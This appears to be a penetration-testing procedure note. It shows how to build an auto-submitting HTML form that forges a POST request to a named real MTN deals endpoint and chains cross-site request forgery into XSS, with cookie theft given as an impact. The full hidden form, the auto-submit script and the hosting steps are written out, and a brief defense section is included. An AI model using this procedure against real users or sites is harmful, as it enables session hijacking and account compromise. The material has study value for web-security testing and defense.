---
tags:
  - csrf
  - poc
  - social-engineering
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:43.105Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 68c59739-77fd-42b5-9e34-2c488bb810a9
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Create-CSRF-PoC-HTML-Form

## Summary

This procedure generates an HTML-based proof-of-concept (PoC) that auto-submits a malicious POST request to the vulnerable MTN deals endpoint, forcing XSS execution from the victim's browser.

## Description

The PoC uses a hidden HTML form with JavaScript to submit the tampered request (including XSS in CFID) without user interaction. When the victim visits the attacker-hosted page while logged into MTN, the form submits, forging the request in their session context. This chains CSRF to XSS for impacts like cookie theft. Requires the crafted payload from prior steps and a hosting service for the PoC.

## Requirements

1. Malicious POST details from previous procedure
2. Basic HTML/JavaScript knowledge
3. Server to host the PoC page (e.g., GitHub Pages or local server)

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens and validate referer headers
- Set SameSite=Strict on session cookies to block cross-site submissions
- Educate users on phishing and monitor for unexpected form submissions

## Objectives

1. Automate submission of forged request from victim context
2. Trigger XSS payload execution
3. Demonstrate full attack impact on authenticated sessions

## Instructions

### Step 1: Build HTML Form

**Context**: Create hidden inputs for all parameters.

Write HTML: <form action="https://deals.mtn.co.za/index.cfm?GO=DEALS" method="POST"><input type="hidden" name="CFID" value="<encoded_payload>"><input type="hidden" name="CFTOKEN" value="0"><input type="hidden" name="category_id" value="9"><input type="hidden" name="cpID" value="1"><input type="hidden" name="location_id" value="0"><input type="hidden" name="m" value="1"></form>.

**Expected Output**: Form structure ready for auto-submit.

### Step 2: Add Auto-Submit Script

**Context**: Use JS to submit on page load.

Add <script>document.forms[0].submit();</script> after the form.

**Expected Output**: Page loads and submits immediately.

### Step 3: Host and Test PoC

**Context**: Deploy and verify from authenticated session.

Host the HTML file and visit while logged into MTN. Use Burp to confirm submission.

**Expected Output**: XSS alert triggers in MTN page.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[csrf]]
- [[poc]]
- [[social-engineering]]
